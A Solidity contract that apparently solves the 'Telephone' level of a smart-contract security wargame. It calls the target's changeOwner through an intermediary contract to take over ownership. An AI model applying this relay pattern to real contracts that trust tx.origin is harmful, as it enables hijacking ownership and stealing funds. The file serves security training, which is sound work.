pragma solidity ^0.5.0;

import '../CoinFlip/CoinFlip.sol';
import '../Telephone/Telephone.sol';

contract AttackTelephone {
  Telephone public telephone;
  address public owner;

  modifier onlyOwner() {
    require(msg.sender == owner, "Not owner!");
    _;
  }

  constructor(address _telephone) public {
    telephone = Telephone(_telephone);
    owner = msg.sender;
  }

  function attack() public onlyOwner {
    telephone.changeOwner(msg.sender);
  }
}